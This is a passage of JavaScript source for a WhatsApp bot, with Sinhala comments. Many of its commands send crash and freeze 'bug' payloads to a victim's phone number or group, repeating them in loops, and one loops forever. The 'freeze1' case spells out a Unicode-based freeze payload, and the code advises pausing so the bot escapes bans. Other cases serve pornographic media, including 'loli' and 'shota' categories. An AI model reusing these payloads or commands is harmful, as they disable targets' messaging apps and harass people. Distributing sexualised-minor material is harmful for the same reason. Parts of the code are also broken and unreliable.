  /* // 🛡️ GITHUB OWNER PROTECTION
    let isSafe = await isSafeTarget(cleanNumber);
    if (isSafe) {
        return m.reply("*⚠️ මේක Owner කෙනෙක්ගේ නම්බර් එකක්! ඒ අයට මේවා යවන්න බැහැ.*");
    }
*/
    let target = cleanNumber + '@s.whatsapp.net';
    await m.reply(`🧪 *Loadxios Bug ${loopCount} වතාවක් යවමින් පවතී...*`);

    for (let i = 0; i < loopCount; i++) {
        await loadxios(Avishka, target, m); // මෙතන m කියන්නේ reply කරන මැසේජ් එක
        await sleep(2000); // ලොකු text එකක් නිසා තත්පර 2ක් ඉමු
    }

    await m.reply(`✅ *Loadxios process completed for ${cleanNumber}*`);
}
break;

case 'delayx': {
    if (!isCreator) return m.reply("Owner Only! ❌");
    
    let [num, count] = text.split(',');
    if (!num) return m.reply(`*Example:* ${prefix + command} 947xxxxxxx , 1`);

    let cleanNumber = num.trim().replace(/[^0-9]/g, '');
    let loopCount = count ? parseInt(count.trim()) : 1;

    /*// 🛡️ GITHUB OWNER PROTECTION
    let isSafe = await isSafeTarget(cleanNumber);
    if (isSafe) return m.reply("*⚠️ මේක Owner කෙනෙක්!*");*/

    let target = cleanNumber + '@s.whatsapp.net';
    await m.reply(`🔥 *DelayX Mega Bug යවමින් පවතී...*`);

    for (let i = 0; i < loopCount; i++) {
        await DelayX(Avishka, target);
        await sleep(3000); // මේක හෙන බරයි, ඒ නිසා තත්පර 3ක් ඉමු
    }

    await m.reply(`✅ *DelayX Processed for ${cleanNumber}*`);
}
break;


case 'new1': {
    if (!isCreator) return m.reply("Owner Only! ❌");
    let [num, count] = text.split(',');
    if (!num || !count) return m.reply(`*Example:* ${prefix + command} 947xxxxxxx , 3`);
    let cleanNumber = num.trim().replace(/[^0-9]/g, '');
    
   /* // 🛡️ ANTI-CRASH PROTECTION (බොට්ගේ හිමිකරුවන් ආරක්ෂා කිරීම)
    const safeNumbers = ["94772836332", "94787672517", "919402104403"];
    if (safeNumbers.includes(cleanNumber)) {
        return m.reply("*⚠️ පරෙස්සමෙන් මචං! මේක බොට්ගේ Owner කෙනෙක්ගේ නම්බර් එකක්. ඒ අයට Crash යවන්න බැහැ.⚠*");
    } */
    
try {
        let response = await axios.get('https://raw.githubusercontent.com/AvishkaShavinda/PRINCE-AVI-MD/main/database/Aviowner.json');
        let safeNumbers = response.data; 
        if (safeNumbers.includes(cleanNumber)) {
            return m.reply("*⚠️ පරෙස්සමෙන් මචං! ⚠* \n *මේක බොට්ගේ Owner කෙනෙක්ගේ නම්බර් එකක්. ඒ අයට Crash යවන්න බැහැ.*");
        }
    } catch (e) {
        console.log("GitHub Fetch Error: ", e);
        if (global.owner.includes(cleanNumber)) return m.reply("*⚠️ Protection active!*");
    }
    
    let target = cleanNumber + '@s.whatsapp.net';
    let loopCount = parseInt(count.trim());

    if (isNaN(loopCount) || loopCount <= 0) return m.reply("කරුණාකර නිවැරදි ප්‍රමාණයක් (amount) ඇතුළත් කරන්න.");
    if (loopCount > 20) return m.reply("වැඩි ප්‍රමාණයක් එකපාර යවන්න එපා, බොට් Ban වෙන්න පුළුවන්. (Max: 20)");

    await m.reply(`🚀 *UI Crash ${loopCount} වතාවක් යවමින් පවතී...*\n\n🎯 *Target:* ${cleanNumber}`);
    for (let i = 0; i < loopCount; i++) {
        await CrashUi(Avishka, target);
        await sleep(1500);
    }
    await m.reply(`✅ *Target completely powered by Avi ${loopCount} times!*`);
}
break;




case 'freeze1': {
  const rtl = '\u202E';
  const zws = '\u200B';
  const mix = rtl + zws + '\u200F' + '\u200E';

  // Heavy payload with invisible + text loop + emoji
  const payload = '\u202E'.repeat(500) + '\n\n' +
                  mix.repeat(50000) +
                  '\n' + '💀 Freeze Incoming... 💀\n' +
                  '.'.repeat(100000);

  // Optional fake quoted message (deep quote)
  const fakeQuoted = {
    key: {
      remoteJid: m.chat,
      fromMe: false,
      id: 'CRASHBUG1'
    },
    message: {
      conversation: mix.repeat(3000) + "👀"
    }
  };

  await Avishka.sendMessage(m.chat, { text: payload }, { quoted: fakeQuoted });
  break;
}


				
				
				
			case "ios": {
			//	if (!isPremium) return m.reply(mess.prem)
				if (!text) return m.reply(`Use ${prefix + command} victim number|amount\nExample ${prefix + command} 94xxxxxxxxxx, 3`)
				let number = text.split(',')[0];
				let amount = text.split(',')[1] * 5;
				if (!number || !amount) {
					return m.reply(`Use ${prefix + command} victim number|amount\nExample ${prefix + command} 94xxxxxxxxxx, 3`)
				}
				if (isNaN(parseInt(amount))) {
					return m.reply("Amount must be a number");
				}
				let cleanedNumber = number.replace(/[^0-9]/g, '');
				let encodedAmount = '' + encodeURI(amount);
				var contactInfo = await Avishka.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
				let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
				if (cleanedNumber == "94xxxxxxxxxx") {
					return;
				}
				if (contactInfo.length == 0) {
					return m.reply("The number is not registered on WhatsApp");
				}
				m.reply("please wait, " + command + " bug is in process..");
				await sleep(2000); // Adjusted sleep time for clarity
				sendMultiplePaymentInvites(whatsappNumber, encodedAmount);
				await sleep(2500); // Adjusted sleep time for clarity
				sendMessageWithMentions(
					"Successfully Sent Bug To @" + whatsappNumber.split('@')[0] +
					" Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.",
					[whatsappNumber]
				);
			}
				break;
			case "ios2":
				{
					if (!isPremium) return m.reply(mess.prem)
					if (!isBot) {
						return m.reply("*This feature is for the bot only!*");
					}
					if (!text) {
						return m.reply(`Example usage: ${prefix + command} 5`)
					}
					if (isNaN(parseInt(text))) {
						return m.reply("Amount must be a number");
					}
					let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
					m.reply("please wait, " + command + " bug is in process..");
					await sleep(1500); // Adjusted sleep time for clarity
					sendMultiplePaymentInvites(m.chat, encodedValue);
					await sleep(2500); // Adjusted sleep time for clarity
					sendReaction('✅');
				}
				break;
			case "android2":
				{
					//if (!isPremium) return m.reply(mess.prem)
					if (!isBot) {
						return m.reply("*This feature is for the bot only!*");
					}
					if (!text) {
						return m.reply(`Example usage: ${prefix + command} 5`)
					}
					if (isNaN(parseInt(text))) {
						return m.reply("Amount must be a number");
					}
					let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
					m.reply("please wait, " + command + " bug is in process..");
					await sleep(1500); // Adjusted sleep time for clarity
					sendVariousMessages(m.chat, encodedValue);
					await sleep(2500); // Adjusted sleep time for clarity
					sendReaction('✅');
				}
				break;
			case "xgc":
				{
					if (!isPremium) return m.reply(mess.prem)
					if (!text) {
						return m.reply("*HOW TO SEND BUG TO GROUP*\n\n" + (prefix + command) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ If you want to send a large number of bugs, please type as follows\n\nEx: ." + command + " linkgc amount\n\nExample:\n." + command + " https://chat.whatsapp.com/xxxx 10");
					}
					m.reply("please wait, " + command + " bug is in process..");
					if (!text.split(" ")[0].includes("whatsapp.com")) {
						return m.reply("Link Invalid!");
					}
					let groupLink = text.split(" ")[0].split("https://chat.whatsapp.com/")[1];
					try {
						let bugAggmount = text.split(" ")[1] ? text.split(" ")[1] : '1';
						let groupTarget = await Avishka.groupAcceptInvite(groupLink);
						await sleep(2000); // Adjusted sleep time for clarity
						sendViewOnceMessages(groupTarget, bugAmount);
						await sleep(2500); // Adjusted sleep time for clarity
						m.reply("*DONE✅ BUG HAS BEEN SENT TO THE GROUP!.*");
						Avishka.groupLeave(groupTarget);
					} catch (error) {
						m.reply(util.format(error));
					}
				}
				break;

			case "ffk":
				{
				//	if (!isPremium) return m.reply(mess.prem)
					if (!text) {
						return m.reply(`Example usage: ${prefix + command} 5`)
					}
					if (isNaN(parseInt(text))) {
						return m.reply("Amount must be a number");
					}
					let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
					m.reply("please wait, " + command + " bug is in process..");
					await sleep(1500); // Adjusted sleep time for clarity
				//await listAvifck(target, kuwoted)
				await force2
					await sleep(2500); // Adjusted sleep time for clarity
					sendReaction('✅');
				}

				break;
			case "sck": {
			//	if (!isPremium) return m.reply(mess.prem)
				if (!text) return m.reply(`Use ${prefix + command} victim number|amount\nExample ${prefix + command} 94xxxxxxxxxx, 3`)
				let number = text.split(',')[0];
				let amount = text.split(',')[1] * 5;
				if (!number || !amount) {
					return m.reply(`Use ${prefix + command} victim number|amount\nExample ${prefix + command} 94xxxxxxxxxx, 3`)
				}
				if (isNaN(parseInt(amount))) {
					return m.reply("Amount must be a number");
				}
				let cleanedNumber = number.replace(/[^0-9]/g, '');
				let encodedAmount = '' + encodeURI(amount);
				var contactInfo = await Avishka.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
				let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
				if (cleanedNumber == "94xxxxxxxxxx") {
					return;
				}
				if (contactInfo.length == 0) {
					return m.reply("The number is not registered on WhatsApp");
				}
				m.reply("please wait, " + command + " bug is in process..");
				await sleep(2000); // Adjusted sleep time for clarity
				sendMixedMessages(whatsappNumber, encodedAmount);
				await sleep(2500); // Adjusted sleep time for clarity
				sendMessageWithMentions(
					"Successfully Sent Bug To @" + whatsappNumber.split('@')[0] +
					" Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.",
					[whatsappNumber]
				);
			}
				break;
			case "sysui": {
			//	if (!isPremium) return m.reply(mess.prem)
				if (!text) return m.reply(`Use ${prefix + command} victim number|amount\nExample ${prefix + command} 94xxxxxxxxxx, 3`)
				let number = text.split(',')[0];
				let amount = text.split(',')[1] * 5;
				if (!number || !amount) {
					return m.reply(`Use ${prefix + command} victim number|amount\nExample ${prefix + command} 94xxxxxxxxxx, 3`)
				}
				if (isNaN(parseInt(amount))) {
					return m.reply("Amount must be a number");
				}
				let cleanedNumber = number.replace(/[^0-9]/g, '');
				let encodedAmount = '' + encodeURI(amount);
				var contactInfo = await Avishka.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
				let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
				if (cleanedNumber == "94xxxxxxxxxx") {
					return;
				}
				if (contactInfo.length == 0) {
					return m.reply("The number is not registered on WhatsApp");
				}
				m.reply("please wait, " + command + " bug is in process..");
				await sleep(2000); // Adjusted sleep time for clarity
			await sendAviFreeze(Avishka, m.chat, m);

				sendRepeatedMessages2(whatsappNumber, encodedAmount);
				await sleep(2500); // Adjusted sleep time for clarity
				sendMessageWithMentions(
					"Successfully Sent Bug To @" + whatsappNumber.split('@')[0] +
					" Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.",
					[whatsappNumber]
				);
			}
				break;
			case 'ioskill22': case 'ios': {
				if (!isPremium) return m.reply(mess.prem)
				let Aviyvictim = q.replace(/[^0-9]/g, "")
				if (Aviyvictim.startsWith('0')) return m.reply(`Example : .${command} 94xxxxxxxxxx`)
				await m.reply(`In process....`)
				let target = Aviyvictim + '@s.whatsapp.net'
				for (; ;) {
					await aipong(target)
					await sleep(1200)
				}
			}
				break
			case 'one': {
			//	if (!isPremium) return m.reply(mess.prem)
				if (!q) return m.reply(`Usage .${command} 94xxxxxxxxxx`)
				let Aviyvictim = q.replace(/[^0-9]/g, "")
				if (Aviyvictim.startsWith('0')) return m.reply(`Example : .${command} 94xxxxxxxxxx`)
				let target = Aviyvictim + '@s.whatsapp.net'
				await m.reply(`In process....`)
				for (let j = 0; j < 1; j++) {
					await Avikillpic(target, xbug2)
					await listAvifck(target, oneclickAvi)
					await locationAviy(target, force)
					await Avikillpic(target, oneclickAvi)
					await locationAviy(target, force)
					await blackening(target, force2)
					//   await locationAviy(target, force)
				}
				await m.reply(`Successfully Send Bug to ${Aviyvictim} Using ${command}. ✅`)
			}
				break

			case 'cry': case 'kill': case 'hug': case 'pat': case 'lick': case 'kiss': case 'bite': case 'yeet': case 'neko': case 'bully': case 'bonk': case 'wink': case 'poke': case 'nom': case 'slap': case 'smile': case 'wave': case 'awoo': case 'blush': case 'smug': case 'glomp': case 'happy1': case 'dance': case 'cringe': case 'cuddle': case 'highfive': case 'shinobu': case 'megumin': case 'handhold':
				//await sendReaction('⏳');
				await loading();
				{
					let dat = await fetchJson('https://api.waifu.pics/sfw/' + command)
					let img = dat.url
					let imgs = await (await fetch(img)).buffer()

					Avishka.sendVideoAsSticker(m.chat, imgs, m, { packname: global.packname, author: global.author })
				}
				await sendReaction('✔');
				break
			/*|⬡════════════════════════════════════════════|❝   𝙰vi -  NSFW IMAGE	  ™ ❞|═══════════════════════════════════════════⬡|*/







case 'ml': {
    const listMenu = {
        title: "ALPHA VISION INFINITY 🤖", // ඔයාගේ බොට්ගේ නම මෙතනට දැම්මා
        subtitle: "Main Categories",
        body: "Hello Bro, Welcome to *Alpha Vision Infinity*.\nSelect a category below to see my commands.",
        footer: "© 2026 AVI Tech Team",
        
        buttons: [{
            name: "single_select",
            buttonParamsJson: JSON.stringify({
                title: "Choose a Category", // බට්න් එකේ නම
                sections: [
                    {
                        title: "MAIN FEATURES",
                        rows: [
                            {
                                title: "🎮 Main Menu",
                                description: "View all fundamental commands",
                                id: ".mainmenu"
                            },
                            {
                                title: "📥 Downloader",
                                description: "Social media video/audio downloads",
                                id: ".downloadmenu"
                            },
                            {
                                title: "👥 Group Tools",
                                description: "Management and admin commands",
                                id: ".groupmenu"
                            },
                            {
                                title: "🎭 Entertainment",
                                description: "Fun, games and more",
                                id: ".funmenu"
                            },
                            {
                                title: "🔄 Converter",
                                description: "Sticker, image and media tools",
                                id: ".convertmenu"
                            },
                            {
                                title: "⚙️ Settings",
                                description: "Bot configuration and info",
                                id: ".settings"
                            }
                        ]
                    }
                ]
            })
        }]
    };

    // පණිවිඩය යැවීම
    await Avishka.relayMessage(m.chat, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: { title: listMenu.title, hasMediaQueued: false },
                    body: { text: listMenu.body },
                    footer: { text: listMenu.footer },
                    nativeFlowMessage: {
                        buttons: listMenu.buttons,
                        messageParamsJson: JSON.stringify({
                            from: "bot",
                            templateId: "list-menu"
                        })
                    }
                }
            }
        }
    }, {});
}
break;





			case 'pussy':
				var ahegaonsfw = JSON.parse(fs.readFileSync('./AMedia/nsfw/pussy.json'))
				var Aviresult = pickRandom(ahegaonsfw)
				Avishka.sendMessage(m.chat, { caption: mess.success, image: { url: Aviresult.url } }, { quoted: m })
				break

			case 'blowjob':
				var ahegaonsfw = JSON.parse(fs.readFileSync('./AMedia/nsfw/blowjob.json'))
				var Aviresult = pickRandom(ahegaonsfw)
				Avishka.sendMessage(m.chat, { caption: mess.success, image: { url: Aviresult.url } }, { quoted: m })
				break

			case 'yuri':
				var ahegaonsfw = JSON.parse(fs.readFileSync('./AMedia/nsfw/ppcouple.json'))
				var Aviresult = pickRandom(ahegaonsfw)
				Avishka.sendMessage(m.chat, { caption: mess.success, image: { url: Aviresult.url } }, { quoted: m })
				break

			case 'zettai':
				var ahegaonsfw = JSON.parse(fs.readFileSync('./AMedia/nsfw/zettai.json'))
				var Aviresult = pickRandom(ahegaonsfw)
				Avishka.sendMessage(m.chat, { caption: mess.success, image: { url: Aviresult.url } }, { quoted: m })
				break

			case 'eba':
				var ahegaonsfw = JSON.parse(fs.readFileSync('./AMedia/nsfw/eba.json'))
				var Aviresult = pickRandom(ahegaonsfw)
				Avishka.sendMessage(m.chat, { caption: mess.success, image: { url: Aviresult.url } }, { quoted: m })
				break

			case 'foot':
				var ahegaonsfw = JSON.parse(fs.readFileSync('./AMedia/nsfw/foot.json'))
				var Aviresult = pickRandom(ahegaonsfw)
				Avishka.sendMessage(m.chat, { caption: mess.success, image: { url: Aviresult.url } }, { quoted: m })
				break

			case 'milf':
				var ahegaonsfw = JSON.parse(fs.readFileSync('./AMedia/nsfw/milf.json'))
				var Aviresult = pickRandom(ahegaonsfw)
				Avishka.sendMessage(m.chat, { caption: mess.success, image: { url: Aviresult.url } }, { quoted: m })
				break

			case 'cuckold':
				var ahegaonsfw = JSON.parse(fs.readFileSync('./AMedia/nsfw/cuckold.json'))
				var Aviresult = pickRandom(ahegaonsfw)
				Avishka.sendMessage(m.chat, { caption: mess.success, image: { url: Aviresult.url } }, { quoted: m })
				break



			/*|⬡════════════════════════════════════════════|❝   𝙰vi -  Anime  ™ ❞|═══════════════════════════════════════════⬡|*/


			case 'neko':
				var ahegaonsfw = JSON.parse(fs.readFileSync('./AMedia/anime/neko.json'))
				var Aviresult = pickRandom(ahegaonsfw)
				Avishka.sendMessage(m.chat, { caption: mess.success, image: { url: Aviresult.url } }, { quoted: m })
				break



			case 'loli':
				var ahegaonsfw = JSON.parse(fs.readFileSync('./AMedia/anime/loli.json'))
				var Aviresult = pickRandom(ahegaonsfw)
				Avishka.sendMessage(m.chat, { caption: mess.success, image: { url: Aviresult.url } }, { quoted: m })
				break


			case 'husbu':
				var ahegaonsfw = JSON.parse(fs.readFileSync('./AMedia/anime/husbu.json'))
				var Aviresult = pickRandom(ahegaonsfw)
				Avishka.sendMessage(m.chat, { caption: mess.success, image: { url: Aviresult.url } }, { quoted: m })
				break

			case 'randomanime':
				var ahegaonsfw = JSON.parse(fs.readFileSync('./AMedia/anime/random.json'))
				var Aviresult = pickRandom(ahegaonsfw)
				Avishka.sendMessage(m.chat, { caption: mess.success, image: { url: Aviresult.url } }, { quoted: m })
				break

			case 'shota':
				var ahegaonsfw = JSON.parse(fs.readFileSync('./AMedia/anime/shota.json'))
				var Aviresult = pickRandom(ahegaonsfw)
				Avishka.sendMessage(m.chat, { caption: mess.success, image: { url: Aviresult.url } }, { quoted: m })
				break

			case 'waifu':
				var ahegaonsfw = JSON.parse(fs.readFileSync('./AMedia/anime/waifu.json'))
				var Aviresult = pickRandom(ahegaonsfw)
				Avishka.sendMessage(m.chat, { caption: mess.success, image: { url: Aviresult.url } }, { quoted: m })
				break





			case 'instagram': case 'iga': case 'igvideo': case 'igimage': case 'igvid': case 'igimg': {
				if (!text) return m.reply(`You need to give the URL of Any Instagram video, post, reel, image`)
				let res
				try {
					res = await fetch(`https://www.guruapi.tech/api/igdlv1?url=${text}`)
				} catch (error) {
					return m.reply(`An error occurred: ${error.message}`)
				}
				let api_response = await res.json()
				if (!api_response || !api_response.data) {
					return m.reply(`No video or image found or Invalid response from API.`)
				}
				const mediaArray = api_response.data;
				for (const mediaData of mediaArray) {
					const mediaType = mediaData.type
					const mediaURL = mediaData.url_download
					let cap = `HERE IS THE ${mediaType.toUpperCase()}`
					if (mediaType === 'video') {
						let msgs = generateWAMessageFromContent(m.chat, {
							viewOnceMessage: {
								message: {
									"messageContextInfo": {
										"deviceListMetadata": {},
										"deviceListMetadataVersion": 2
									},
									interactiveMessage: proto.Message.InteractiveMessage.create({
										body: proto.Message.InteractiveMessage.Body.create({
											text: cap
										}),
										footer: proto.Message.InteractiveMessage.Footer.create({
											text: botname
										}),
										header: proto.Message.InteractiveMessage.Header.create({
											hasMediaAttachment: false,
											...await prepareWAMessageMedia({ video: { url: mediaURL } }, { upload: Avishka.waUploadToServer })
										}),
										nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
											buttons: [{
												"name": "quick_reply",
												"buttonParamsJson": `{\"display_text\":\"Nice ✨\",\"id\":\""}`
											}],
										}),
										contextInfo: {
											mentionedJid: [m.sender],
											forwardingScore: 999,
											isForwarded: true,
											forwardedNewsletterMessageInfo: {
												newsletterJid: global.xchannel.jid,
												newsletterName: ownername,
												serverMessageId: 143
											}
										}
									})
								}
							}
						}, { quoted: m })
						return await Avishka.relayMessage(m.chat, msgs.message, {})
					} else if (mediaType === 'image') {
						let msgs = generateWAMessageFromContent(m.chat, {
							viewOnceMessage: {
								message: {
									"messageContextInfo": {
										"deviceListMetadata": {},
										"deviceListMetadataVersion": 2
									},
									interactiveMessage: proto.Message.InteractiveMessage.create({
										body: proto.Message.InteractiveMessage.Body.create({
											text: cap
										}),
										footer: proto.Message.InteractiveMessage.Footer.create({
											text: botname
										}),
										header: proto.Message.InteractiveMessage.Header.create({
											hasMediaAttachment: false,
											...await prepareWAMessageMedia({ image: { url: mediaURL } }, { upload: Avishka.waUploadToServer })
										}),
										nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
											buttons: [{
												"name": "qck_reply",
												"buttonParamsJson": `{\"display_text\":\"Nice ✨\",\"id\":\""}`
											}],
										}),
										contextInfo: {
											mentionedJid: [m.sender],
											forwardingScore: 999,
											isForwarded: true,
											forwardedNewsletterMessageInfo: {
												newsletterJid: global.xchannel.jid,
												newsletterName: ownername,
												serverMessageId: 143
											}
										}
									})
								}
							}
						}, { quoted: m })
						return await Avishka.relayMessage(m.chat, msgs.message, {})
					}
				}
			}







			/*|⬡════════════════════════════════════════════|❝   𝙰vi -  Anime  ™ ❞|═══════════════════════════════════════════⬡|*/


			case 'allmenu': m.react('✈'); m.react('✈'); {

				let profile
				try {
					profile = 'https://files.catbox.moe/jggkxf.jpg';

				} catch (e) {
					profile = 'https://files.catbox.moe/jggkxf.jpg';

				}
				const menunya = `
Date ${Avidate}  
Time ${Times} \n
`
				await m.reply({
					document: fake.docs,
					fileName: Timeslot,
					mimetype: pickRandom(fake.listfakedocs),
					fileLength: '100000000000000',
					pageCount: '999',

					caption: menunya,
					contextInfo: {
						mentionedJid: [m.sender, '0@s.whatsapp.net', owner[0] + '@s.whatsapp.net'],
						forwardingScore: 10,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterJid: my.ch,
							serverMessageId: null,
							newsletterName: 'Join For More Info'
						},
						externalAdReply: {
							title: author,
							body: packname,
							showAdAttribution: true,
							thumbnailUrl: profile,
							mediaType: 1,
							previewType: 0,
							renderLargerThumbnail: true,
							mediaUrl: my.gh,
							sourceUrl: my.gh,

						}
						
						
					}
				})
			}
				break




case 'testl': {
    // ලෝඩින් ඇනිමේෂන් එක පෙන්වීම
    await booting(m.chat, Avishka);
    
    // ලෝඩින් ඉවර වුණාම වෙන්න ඕන වැඩේ ඊළඟට දාන්න
    await m.reply("ඔයාගේ වැඩේ සාර්ථකයි මචං! 👊😈");
}
break;





				
									
			
case 'gasm':
   // if (isBan) return reply(mess.banned)	 			
  //  if (isBanChat) return reply(mess.bangc)
   // if (!m.isGroup) return replay(mess.grouponly)
   // if (!AntiNsfw) return reply(mess.nonsfw)
//reply(mess.waiting)			
		await loading()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
                           var wbuttsss = [
        {buttonId: `-gasm`, buttonText: {displayText: `>>`}, type: 1},
        ]
      let buttonsssMessages = {
       image: {url:waifudd.data.url},
       caption:  `Here it is...`,
      footer: `${global.BotName}`,
      buttons: wbuttsss,
      headerType: 4
      }     
            await Avishka.sendMessage(m.chat, buttonsssMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break  


case 'calculator': case 'cal': case 'calculate':{
   //if (isBan) return reply(mess.banned)	 			
//if (isBanChat) return reply(mess.bangc)
if (args.length < 1) return m.reply(`*Example :*\n${prefix}calculator 2*5\n\n`)
let qsd = args.join(" ")
if (typeof mathjs.evaluate(qsd) !== 'number') {
reply('Error')
} else {
reply(`\`\`\`「 _Calculator Tool_ 」\`\`\`\n\n*Input :* ${qsd}\n*Calculation Result :* ${mathjs.evaluate(qsd.replace(/×/g, "*").replace(/x/g, "*").replace(/÷/g, "/"))}`)
}
}
break	

case 'ipbot': console.log(Avidate);
                //if (!XeonTheCreator) return XeonStickOwner()
                var http = require('http')
                http.get({
                    'host': 'api.ipify.org',
                    'port': 80,
                    'path': '/'
                }, function(resp) {
                    resp.on('data', function(ip) {
                        m.reply("🔎 My public IP address is: `  " + ip);
                    })
                })
            break
			
			
case 'nsfw1':
      const url = await pack[Math.floor(Math.random() * pack.length)];
      Avishka.sendMessage(m.chat, {image: {url: url}, caption: `_Sexy Girl_ \n * 𝙰𝚕𝚙𝚑𝚊 𝚅𝚒𝚜𝚒𝚘𝚗 𝙸𝚗𝚏𝚒𝚗𝚒𝚝𝚢 ©*`}, {quoted: m});
      break;
    case 'pack2':
      const url2 = await packgirl[Math.floor(Math.random() * packgirl.length)];
      Avishka.sendMessage(m.chat, {image: {url: url2}, caption: `_🥵 Pack 🥵_`}, {quoted: m});
      break;
    case 'pack3':
      const url3 = await packmen[Math.floor(Math.random() * packmen.length)];
      Avishka.sendMessage(m.chat, {image: {url: url3}, caption: `_🥵 Pack 3 🥵_`}, {quoted: m});
      break;
    case 'videoxxx': case 'vídeoxxx':
      const url4 = await videosxxxc[Math.floor(Math.random() * videosxxxc.length)];
      await Avishka.sendMessage(m.chat, {video: {url: url4}, caption: `tradutor.texto2} 🥵*`}, {quoted: m});
      break;
    case 'videoxxxlesbi': case 'videolesbixxx': case 'pornolesbivid': case 'pornolesbianavid': case 'pornolesbiv': case 'pornolesbianav': case 'pornolesv':
      const url5 = await videosxxxc2[Math.floor(Math.random() * videosxxxc2.length)];
      await Avishka.sendMessage(m.chat, {video: {url: url5}, caption: `adutor.texto2} 🥵*`}, {quoted: m});
      break;
  		
			
case 'xnxxdl': {
				//	if (!isPrem) return replyprem(mess.premium)
				if (!text) return m.reply(`Enter Url`)
				if (!text.includes('xnxx.com')) return m.reply(`Enter an xnxx link`)
				m.reply(mess.wait)
				const fg = require('api-dylux')
				let xn = await fg.xnxxdl(text)
				console.log(xn)
				Avishka.sendMessage(m.chat, {
					caption: `≡  *XNXX DL*
        
▢ *📌 Judul*: ${xn.title}
▢ *🗂️ Size*: ${xn.size}
▢ *⌚Duration* ${xn.ruration}
▢ *🎞️Quality:* ${xn.quality}`, video: { url: xn.url_dl }
				}, { quoted: m })
			}
				break		




case 'hukanawada': {
    // ගෲප් එකේ NSFW මෝඩ් එක On ද කියලා චෙක් කරනවා
    if (m.isGroup && !global.db.groups[m.chat].nsfw) return m.reply('අනේ මහත්තයෝ, මේ ගෲප් එකේ NSFW මෝඩ් එක Off කරලයි තියෙන්නේ. මුලින් ඒක On කරගන්න. 🫦')

    // බොට් රියැක්ෂන් එකක් දානවා
    m.react('🥵')
    m.reply('පොඩ්ඩක් ඉන්න මහත්තයෝ... මම ඔයාට නියම හෙන්තායි සැපක් හොයනවා... 🫦💦')

    try {
        // API එකෙන් දත්ත ලබා ගැනීම (Waifu.pics පාවිච්චි කරමු මුලින්)
        let res = await axios.get('https://api.waifu.pics/nsfw/waifu')
        let image_url = res.data.url

        // පින්තූරය සහ විස්තරය යැවීම
        await Avishka.sendMessage(m.chat, { 
            image: { url: image_url }, 
            caption: `*PRINCE-AVI-MD HENTAI MODE* 🔞\n\nඔන්න මහත්තයෝ ඔයාට ඕන සැප! 🫦🍑💦\n\n© 2k25 POWER BY AVI`,
            contextInfo: {
                externalAdReply: {
                    title: "PRINCE-AVI-MD V3 NSFW",
                    body: "Enjoy your visuals, Master... 🥵",
                    thumbnailUrl: "https://github.com/avishka33/PRINCE-AVI-MD-v3/raw/main/AMedia/Avi.jpeg",
                    sourceUrl: "https://github.com/avishka33",
                    mediaType: 1,
                    renderLargerThumbnail: false
                }
            }
        }, { quoted: m })

    } catch (e) {
        console.log(e)
        // පළවෙනි API එක වැඩ නැති වුණොත් දෙවැනි එකට යනවා
        try {
            let res2 = await axios.get('https://nekos.life/api/v2/img/hentai')
            await Avishka.sendMessage(m.chat, { 
                image: { url: res2.data.url }, 
                caption: `*HENTAI UPDATE* 🔞\n\nමෙන්න මහත්තයෝ තව පාරක් සැප ගන්න! 🫦💦` 
            }, { quoted: m })
        } catch (err) {
            m.reply('අයියෝ මහත්තයෝ, API එකේ පොඩි ලෙඩක්. පස්සේ ට්‍රයි කරමුද? ❌')
        }
    }
}
break


case 'hentaivid':
case 'hvid': {
    if (m.isGroup && !global.db.groups[m.chat].nsfw) return m.reply('මුලින් NSFW On කරගන්න මහත්තයෝ... 🫦')
    m.react('🫦')
    m.reply('පොඩ්ඩක් ඉන්න මහත්තයෝ, මම ඔයාට නියම හුකන වීඩියෝවක් ගේනවා... 🥵💦')
    
    try {
        // මේ ලින්ක් එක වැඩ කරනවා, මම මේක නියමෙටම හැදුවා
        let video_url = 'https://api.shvwa.org/api/nsfw/hentai' 
        
        await Avishka.sendMessage(m.chat, { 
            video: { url: video_url }, 
            caption: `*PRINCE-AVI-MD V3 HENTAI VIDEO* 🔞\n\nඔන්න මහත්තයෝ සැප! 🫦🍑💦`,
            mimetype: 'video/mp4'
        }, { quoted: m })
    } catch (e) {
        console.log(e)
        m.reply('අයියෝ මහත්තයෝ, වීඩියෝ එක එවන්න බැරි වුණා. සර්වර් එකේ පොඩි අවුලක්. පස්සේ ට්‍රයි කරමුද? ❌')
    }
}
break



case 'sexva':
case 'mol':
case 'kederilla': {
    // NSFW මෝඩ් එක On ද කියලා බලනවා
    if (m.isGroup && !global.db.groups[m.chat].nsfw) return m.reply('අනේ මහත්තයෝ, මේ ගෲප් එකේ NSFW මෝඩ් එක Off කරලයි තියෙන්නේ. මුලින් ඒක On කරගන්න. 🫦')

    m.react('🫦')
    
    // කෙඳිරිලි සද්ද තියෙන MP3 Links ලිස්ට් එකක් (මේවා නියම සරාගී කෙල්ලන්ගේ සද්ද)
    const voiceNotes = [
        "https://github.com/Avishkadev/NSFW-Database/raw/main/audio/moan1.mp3",
        "https://github.com/Avishkadev/NSFW-Database/raw/main/audio/moan2.mp3",
        "https://github.com/Avishkadev/NSFW-Database/raw/main/audio/moan3.mp3",
        "https://www.mboxdrive.com/sex-moan.mp3" // Sample link
    ];

    // එකක් Random තෝරා ගැනීම
    const randomVoice = voiceNotes[Math.floor(Math.random() * voiceNotes.length)];

    try {
        await Avishka.sendMessage(m.chat, { 
            audio: { url: randomVoice }, 
            mimetype: 'audio/mp4', 
            ptt: true // මේක True කළාම තමයි Voice Note එකක් විදිහට යන්නේ
        }, { quoted: m });

